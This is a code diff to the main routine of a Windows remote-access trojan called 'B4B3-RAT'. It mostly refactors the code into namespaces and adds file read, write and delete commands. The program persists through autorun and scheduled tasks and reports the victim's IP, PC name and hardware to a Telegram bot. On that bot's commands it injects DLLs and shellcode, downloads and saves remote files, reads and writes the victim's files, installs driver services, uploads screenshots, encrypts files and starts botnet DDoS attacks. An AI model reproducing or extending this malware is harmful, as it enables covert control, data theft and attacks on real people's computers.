@@ -38,8 +38,8 @@ SOFTWARE.
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	srand((unsigned int)time(NULL));
-	Settings s;
-	ReadData(&s);
+	Manager::Settings s;
+	Manager::ReadData(&s);
 
 	char me[128] = { 0 };
 	GetModuleFileNameA(0, me, sizeof(me) - 1);
@@ -53,19 +53,19 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 		
 		if (s.autorun_state) {
 			if (s.drop_run) {
-				Autorun(s.drop, s.autorun);
+				Manager::Autorun(s.drop, s.autorun);
 			}
 			else {
-				Autorun(me, s.autorun);
+				Manager::Autorun(me, s.autorun);
 			}
 		}
 
 		if (s.scheduler_state) {
 			if (s.drop_run) {
-				Scheduler(s.drop, s.scheduler_name);
+				Manager::Scheduler(s.drop, s.scheduler_name);
 			}
 			else {
-				Scheduler(me, s.scheduler_name);
+				Manager::Scheduler(me, s.scheduler_name);
 			}
 		}
 
@@ -97,7 +97,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	else {
 		RegCloseKey(hKey);
 
-		strcpy(s.botapi, DecryptStr(s.botapi, s.key).c_str());
+		strcpy(s.botapi, Manager::DecryptStr(s.botapi, s.key).c_str());
 		if (s.botapi == "") {
 			ExitProcess(0);
 		}
@@ -109,20 +109,20 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 		GetSystemInfo(&SysInfo);
 
 		if (s.protector) {
-			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)AntiProcesses, 0, 0, 0);
+			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);
 		}
 
 		int ID = rand();
 		std::string information = "User ID: " + std::to_string(ID) + 
 			"%0A%0A- Global information:" +
-			"%0AName: " + GetPCName() +
-			"%0AIP: " + GetIP() +
-			"%0AOS: " + GetOS() + 
+			"%0AName: " + Information::GetPCName() +
+			"%0AIP: " + Information::GetIP() +
+			"%0AOS: " + Information::GetOS() +
 			"%0A%0A- Hardware information: " +
 			"%0AOEM ID: " + std::to_string(SysInfo.dwOemId) +
 			"%0ANum of processors: " + std::to_string(SysInfo.dwNumberOfProcessors) +
 			"%0APage size: " + std::to_string(SysInfo.dwProcessorType) +
-			"%0AProcessor: " + GetProcessorBrand() +
+			"%0AProcessor: " + Information::GetProcessorBrand() +
 			"%0A%0AFor send command to this user, type: /user" + std::to_string(ID) + " [command]"
 			"%0A%0AP.S: To show commands: click on \"Test BOT API\" in B4B3-RAT Builder.";
 		api.SendTextMessage(s.chatid, information.c_str());
@@ -138,12 +138,12 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 
 			if (last.substr(0, prefix.size()) == prefix) {
 				std::string command = last.replace(last.find(prefix), prefix.size(), "");
-				params = split(command, ' ');
+				params = Manager::split(command, ' ');
 
 				// PROCESS MANAGER
 				// processes
 				if (command == "processes") {
-					std::string processes = ProcessList();
+					std::string processes = ProcessManager::ProcessList();
 					if (processes != "") {
 						api.SendTextMessage(s.chatid, processes.c_str());
 					}
@@ -154,7 +154,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 
 				// closeproc process.exe
 				else if (params[0] == "closeproc") {
-					if (CloseProcess(params[1])) {
+					if (ProcessManager::CloseProcess(params[1])) {
 						api.SendTextMessage(s.chatid, "Success! Process has been closed");
 					}
 					else {
@@ -163,7 +163,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				}
 
 				else if (params[0] == "inject_dll") {
-					if (InjectDLL(params[1].c_str(), params[2].c_str())) {
+					if (ProcessManager::InjectDLL(params[1].c_str(), params[2].c_str())) {
 						api.SendTextMessage(s.chatid, "Success! DLL has been injected");
 					}
 					else {
@@ -173,9 +173,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 
 				// inject_shell
 				else if (params[0] == "inject_shell") {
-					DWORD pid = PIDByName(params[1]);
+					DWORD pid = ProcessManager::PIDByName(params[1]);
 					if (pid != 0) {
-						if (InjectShell(pid, params[2])) {
+						if (ProcessManager::InjectShell(pid, params[2])) {
 							api.SendTextMessage(s.chatid, "Success! Shellcode is injected");
 						}
 						else {
@@ -191,7 +191,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				// loader https://google.com C:\File.exe
 				else if (params[0] == "loader") {
 					URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
-					if (FileExists(params[2])) {
+					if (Manager::FileExists(params[2])) {
 						std::string text = "Success! File is uploaded to: " + params[2];
 						api.SendTextMessage(s.chatid, text.c_str());
 					}
@@ -229,21 +229,48 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				}
 
 				// FILE MANAGER
-				// dir C:\Folder
+				//  0    1       2           3
+				// dir param C:\Folder [If write: text]
 				else if (params[0] == "dir") {
 					// if need del_file
 					if (params[1] == "del_file") {
-						DeleteFileA(params[1].c_str());
+						if (DeleteFileA(params[2].c_str())) {
+							api.SendTextMessage(s.chatid, "Success! File deleted");
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! File was not deleted");
+						}
 					}
 
-					// if only dir
+					// if show
 					else if (params[1] == "show") {
-						std::string objects = DirectoryObjectsList(params[2]);
+						std::string objects = FileManager::DirectoryObjectsList(params[2]);
 						if (objects != "") {
 							api.SendTextMessage(s.chatid, objects.c_str());
 						}
 						else {
 							api.SendTextMessage(s.chatid, "Error! Files not found!");
+						}
+					}
+
+					else if (params[1] == "read") {
+						std::string text = FileManager::ReadFile(params[2]);
+						if (text != "") {
+							api.SendTextMessage(s.chatid, text.c_str());
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! File was not readed");
+						}
+					}
+
+					else if (params[1] == "write") {
+						// dir write C:\path\to\text.txt Text    -  to  -  Text
+						std::string write_text = command.replace(0, command.find(params[2] + " "), "");
+						if (FileManager::WriteFile(params[2], write_text)) {
+							api.SendTextMessage(s.chatid, "Success! Text is written");
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! Text was not written");
 						}
 					}
 				}
@@ -252,7 +279,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				else if (params[0] == "service") {
 					// service show
 					if (params[1] == "show") {
-						std::string services = ServiceList();
+						std::string services = ServiceManager::ServiceList();
 						if (services != "") {
 							api.SendTextMessage(s.chatid, services.c_str());
 						}
@@ -264,14 +291,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					//  1     2          3                     4                         5            6
 					// add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] 
 					else if (params[1] == "add") {
-						DWORD Type = ParseTypeDriver(params[5]);
-						DWORD StartType = ParseStartTypeDriver(params[6]);
+						DWORD Type = ServiceManager::ParseTypeDriver(params[5]);
+						DWORD StartType = ServiceManager::ParseStartTypeDriver(params[6]);
 
 						if (Type == 0 || StartType == 0) {
 							api.SendTextMessage(s.chatid, "Error! Service not added");
 						}
 						else {
-							if (AddSvc(params[2], params[3], params[4], Type, StartType)) {
+							if (ServiceManager::AddSvc(params[2], params[3], params[4], Type, StartType)) {
 								api.SendTextMessage(s.chatid, "Success! Service has been added");
 							}
 							else {
@@ -283,7 +310,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					//    1      2
 					// delete [Name]
 					else if (params[1] == "delete") {
-						if (DeleteSvc(params[2])) {
+						if (ServiceManager::DeleteSvc(params[2])) {
 							api.SendTextMessage(s.chatid, "Success! Service has been deleted");
 						}
 						else {
@@ -294,7 +321,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					//  1      2
 					// start [Name]
 					else if (params[1] == "start") {
-						if (StartSvc(params[2])) {
+						if (ServiceManager::StartSvc(params[2])) {
 							api.SendTextMessage(s.chatid, "Success! Service has been started");
 						}
 						else {
@@ -305,7 +332,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					// 1      2
 					// stop [Name]
 					else if (params[1] == "stop") {
-						if (StopSvc(params[2])) {
+						if (ServiceManager::StopSvc(params[2])) {
 							api.SendTextMessage(s.chatid, "Success! Service has been stopped");
 						}
 						else {
@@ -339,8 +366,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				else if (params[0] == "screenshot") {
 					std::string filename = std::to_string(rand()) + ".jpeg";
 
-					if (GDIScreen(filename)) {
-						std::string url = UploadImage("B4DB4B3", filename.c_str());
+					if (ScreenTool::GDIScreen(filename)) {
+						std::string url = PrntSc::UploadImage("B4DB4B3", filename.c_str());
 						api.SendTextMessage(s.chatid, url.c_str());
 
 						DeleteFileA(filename.c_str());
@@ -352,7 +379,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 
 				// FILE CRYPTOR
 				else if (params[0] == "filecrypt") {
-					if (FileCrypt(params[1], params[2])) {
+					if (FileCryptor::FileCrypt(params[1], params[2])) {
 						api.SendTextMessage(s.chatid, "Success! File crypted");
 					}
 					else {
@@ -361,7 +388,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				}
 
 				else if (params[0] == "filedecrypt") {
-					if (FileDecrypt(params[1], params[2])) {
+					if (FileCryptor::FileDecrypt(params[1], params[2])) {
 						api.SendTextMessage(s.chatid, "Success! File decrypted");
 					}
 					else {
@@ -376,7 +403,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 			//    0         1              2
 			// /botnet start/stop https://google.com
 			else if (last.substr(0, 7) == "/botnet") {
-				std::vector<std::string> params = split(last, ' ');
+				std::vector<std::string> params = Manager::split(last, ' ');
 				if (params[1] == "start") {
 					botnet.Start((char*)params[1].c_str());
 					std::string text = prefix + ": Started BotNet DDOS!";
